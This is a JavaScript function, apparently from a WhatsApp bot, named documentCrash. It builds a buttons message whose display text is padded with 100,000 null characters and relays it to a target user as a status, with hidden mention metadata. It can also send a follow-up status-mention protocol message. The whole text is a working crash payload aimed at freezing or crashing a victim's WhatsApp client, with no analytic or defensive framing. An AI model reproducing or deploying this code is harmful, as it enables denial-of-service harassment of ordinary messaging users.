async function documentCrash(target, mention) {
let msg = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "🩸",
contentText:
"⏤͟͟͞͞𝐑𝐚͢𝐣𝐚𝐚⃔𝐗𝐲𝐫𝐢⃭𝐧𝐞⃬⃑☠",
footerText: "⏤͟͟͞͞𝐑𝐚͢𝐣𝐚𝐚⃔𝐗𝐲𝐫𝐢⃭𝐧𝐞⃬⃑☠༑",
buttons: [
{
buttonId: ".bugs",
                buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(100000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "DocumentTrash" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }